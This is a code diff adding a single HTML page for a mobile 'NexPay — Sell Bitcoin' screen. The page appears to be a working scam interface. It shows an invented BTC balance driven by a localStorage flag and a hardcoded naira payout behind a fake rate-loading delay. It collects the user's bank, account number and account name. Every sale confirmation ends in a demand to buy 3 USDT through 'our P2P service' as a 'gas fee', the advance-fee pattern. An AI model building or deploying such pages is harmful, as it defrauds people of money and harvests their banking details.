@@ -1,1 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+<title>NexPay — Sell Bitcoin</title>
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #f8fafc;
+    --card: #ffffff;
+    --border: #e2e8f0;
+    --pri: #0052ff;
+    --pri-dark: #1d4ed8;
+    --text: #0f172a;
+    --text-dim: #64748b;
+    --accent: #10b981;
+    --danger: #ef4444;
+  }
+
+  * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+  body { margin: 0; background: var(--bg); color: var(--text); display: flex; flex-direction: column; min-height: 100vh; padding: 20px; }
+
+  header { text-align: left; margin-bottom: 24px; padding-left: 5px; }
+  header h1 { font-size: 24px; font-weight: 800; margin: 0; letter-spacing: -0.5px; color: var(--text); }
+
+  .balance {
+    background: #ffffff;
+    border: 1px solid var(--border); padding: 20px; border-radius: 16px;
+    text-align: center; margin-bottom: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+  }
+  .balance p { margin: 0 0 8px; font-size: 13px; color: var(--text-dim); font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+  .balance strong { font-size: 22px; color: var(--text); font-weight: 800; }
+
+  .input-group { margin-bottom: 20px; }
+  .input-group label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 600; color: var(--text-dim); }
+
+  .field-wrap { position: relative; display: flex; align-items: center; }
+  input, select {
+    width: 100%; padding: 16px; border-radius: 12px;
+    border: 1px solid var(--border); background: #f1f5f9;
+    color: var(--text); font-size: 16px; font-weight: 600; outline: none; transition: all 0.2s;
+  }
+  input:focus, select:focus { border-color: var(--pri); background: #ffffff; box-shadow: 0 0 0 4px rgba(0, 82, 255, 0.1); }
+
+  .all-btn {
+    position: absolute; right: 10px; padding: 8px 14px;
+    border: none; border-radius: 8px; background: var(--pri);
+    color: #fff; font-weight: 700; font-size: 12px; cursor: pointer;
+    box-shadow: 0 2px 6px rgba(0, 82, 255, 0.2);
+  }
+
+  .details-box {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 20px; margin-top: 5px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+  }
+  .details-box h3 { margin: 0 0 15px; font-size: 14px; color: var(--pri); text-transform: uppercase; letter-spacing: 1px; }
+
+  .sell-btn {
+    width: 100%; padding: 18px; font-size: 17px; font-weight: 800;
+    border: none; border-radius: 12px; background: var(--accent);
+    color: #fff; margin-top: 30px; cursor: pointer;
+    box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2); transition: transform 0.1s, background 0.2s;
+  }
+  .sell-btn:active { transform: scale(0.98); }
+
+  /* Popups */
+  .popup, .alert-popup {
+    position: fixed; inset: 0; background: rgba(15, 23, 42, 0.6);
+    backdrop-filter: blur(8px); display: none; justify-content: center;
+    align-items: center; z-index: 2000; padding: 20px;
+  }
+  .popup-content, .alert-box {
+    background: #ffffff; border: 1px solid var(--border);
+    padding: 30px; border-radius: 20px; width: 100%; max-width: 400px;
+    text-align: center; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+    animation: pop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+  @keyframes pop { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+  .confirm-btn { background: var(--pri); color: #fff; margin-bottom: 10px; box-shadow: 0 4px 12px rgba(0, 82, 255, 0.2); }
+  .close-btn { background: transparent; border: 1px solid var(--border); color: var(--text-dim); }
+  .confirm-btn, .close-btn, .alert-btn { width: 100%; padding: 16px; border-radius: 12px; font-weight: 700; cursor: pointer; border: none; transition: background 0.2s; }
+
+  .loader-dots::after { content: '...'; animation: dots 1.5s steps(5, end) infinite; }
+  @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Sell Bitcoin</h1>
+</header>
+
+<div class="balance">
+  <p>Available Balance</p>
+  <strong id="balanceText">0.00 BTC ≈ $0</strong>
+</div>
+
+<div class="input-group">
+  <label for="amount">BTC Amount (Min. 0.0056)</label>
+  <div class="field-wrap">
+    <input type="number" id="amount" step="0.0001" placeholder="0.0056" inputmode="decimal">
+    <button class="all-btn" onclick="setAll()">MAX</button>
+  </div>
+</div>
+
+<div class="input-group">
+  <label>Estimated Payout (NGN)</label>
+  <input type="text" id="nairaValue" readonly placeholder="₦0.00">
+</div>
+
+<div class="details-box">
+  <h3>Receiver Bank Details</h3>
+  <div class="input-group">
+    <select id="bank">
+      <option value="">-- Select Bank --</option>
+      <option>Access Bank</option><option>GTBank</option><option>Opay</option>
+      <option>Palmpay</option><option>Zenith Bank</option><option>UBA</option>
+      <option>First Bank</option><option>Kuda Bank</option>
+    </select>
+  </div>
+  <div class="input-group">
+    <input type="number" id="account" inputmode="numeric" placeholder="Account Number (10 digits)">
+  </div>
+  <div class="input-group" style="margin-bottom: 5px;">
+    <input type="text" id="accountName" placeholder="Full Account Name">
+  </div>
+  <small style="color:var(--text-dim); font-size:11px; display:block; padding: 5px; color: #ef4444;">
+    Please enter your account name exactly as it is registered with your bank. Mismatched details will cause processing delays and may result in the transaction being declined.
+  </small>
+</div>
+
+<button class="sell-btn" onclick="showPopup()">Process Sale</button>
+
+<div class="popup" id="popup">
+  <div class="popup-content">
+    <div style="font-size: 40px; margin-bottom: 10px;">⚡</div>
+    <h2 style="margin:0 0 10px; font-weight:800; color:var(--text);">Confirm Sale</h2>
+    <div style="background: #f1f5f9; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: left; border: 1px solid var(--border);">
+        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Selling:</span><strong id="popBtc" style="color:var(--text)">0.0056 BTC</strong></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--text-dim)">Payout:</span><strong style="color:var(--pri)">₦475,978</strong></div>
+        <div style="display:flex; justify-content:space-between;"><span style="color:var(--text-dim)">Network Fee:</span><span style="color:var(--text)">$3 USDT</span></div>
+    </div>
+    <button class="confirm-btn" onclick="insufficient()">Confirm Transaction</button>
+    <button class="close-btn" onclick="closePopup()">Go Back</button>
+  </div>
+</div> 
+  
+<div class="alert-popup" id="alertBox">
+  <div class="alert-box">
+    <div id="alertIcon" style="font-size: 48px; margin-bottom: 15px;">⛽</div>
+    <h3 id="alertTitle" style="color:var(--text); margin-bottom:10px; font-weight: 800;"></h3>
+    <p id="alertMessage" style="color:var(--text-dim); line-height:1.6; margin-bottom:20px; text-align: left; white-space: pre-line; font-size: 14px;"></p>
+    <button class="alert-btn" style="background:var(--pri); color:white; box-shadow: 0 4px 12px rgba(0, 82, 255, 0.2);" onclick="closeAlert()">Understood</button>
+  </div>
+</div>
+
+<script>
+  const rate = 463264;
+  const amountInput = document.getElementById('amount');
+  const nairaValue = document.getElementById('nairaValue');
+  const balanceText = document.getElementById('balanceText');
+
+  let hasBalance = localStorage.getItem("balanceUpgraded") === "true";
+  balanceText.textContent = hasBalance ? "0.0056 BTC ≈ €300" : "0.00 BTC ≈ €0";
+
+  function setAll() {
+    if(!hasBalance) {
+        amountInput.value = 0;
+        nairaValue.value = "₦0";
+        return;
+    }
+    amountInput.value = 0.0056;
+    calculate();
+  }
+
+  function calculate() {
+    const val = parseFloat(amountInput.value);
+    if(hasBalance && val >= 0.0056) {
+        nairaValue.value = "Fetching Rate...";
+        nairaValue.classList.add('loader-dots');
+        setTimeout(() => {
+            nairaValue.value = "₦" + rate.toLocaleString();
+            nairaValue.classList.remove('loader-dots');
+        }, 1800);
+    } else {
+        nairaValue.value = "₦0";
+    }
+  }
+
+  amountInput.addEventListener('input', calculate);
+
+  function showPopup(){
+    if(!hasBalance) {
+      triggerAlert("Empty Wallet", "You do not have any BTC available to sell.", "📁");
+      return;
+    }
+    if(parseFloat(amountInput.value) < 0.0056 || !amountInput.value) {
+      alert("Minimum amount is 0.0056 BTC");
+      return;
+    }
+    if(document.getElementById('account').value.length < 10) {
+      alert("Please enter a valid 10-digit NUBAN account number.");
+      return;
+    }
+    document.getElementById('popBtc').textContent = amountInput.value + " BTC";
+    document.getElementById('popup').style.display = 'flex';
+  }
+
+  function triggerAlert(title, msg, icon) {
+    document.getElementById('alertTitle').textContent = title;
+    document.getElementById('alertMessage').textContent = msg;
+    document.getElementById('alertIcon').textContent = icon;
+    document.getElementById('alertBox').style.display = 'flex';
+  }
+
+  function insufficient() {
+    closePopup();
+    setTimeout(() => {
+        const title = "Action Required: Gas Fee Needed";
+        const message = "To complete this sale, a  network fee (Gas Fee) is required by the blockchain to process your transaction. Your current USDT balance is 0.00.\n\n" +
+                        "Follow these steps to solve this:\n" +
+                        "1. Return to your Dashboard.\n" +
+                        "2. Tap on the 'Buy / Sell' menu.\n" +
+                        "3. Buy at least 3 USDT via our P2P service.\n" +
+                        "4. Once the USDT is in your wallet, return here to finalize your sale.";
+        
+        triggerAlert(title, message, "⛽");
+    }, 400);
+  }
+
+  function closePopup(){ document.getElementById('popup').style.display = 'none'; }
+  function closeAlert(){ document.getElementById('alertBox').style.display = 'none'; }
+
+  const fields = ['bank', 'account', 'accountName'];
+  fields.forEach(id => {
+    const el = document.getElementById(id);
+    el.value = localStorage.getItem('sell_'+id) || '';
+    el.addEventListener('input', () => localStorage.setItem('sell_'+id, el.value));
+  });
+
+  setInterval(() => {
+    const last = localStorage.getItem('lastActiveTime');
+    if(last && (Date.now() - last > 60000)) window.location.href = 'pin.html';
+  }, 2000);
+  function reset() { localStorage.setItem('lastActiveTime', Date.now()); }
+  ['click','touchstart','input'].forEach(e => document.addEventListener(e, reset));
+</script>
+
+</body>
+</html>
 
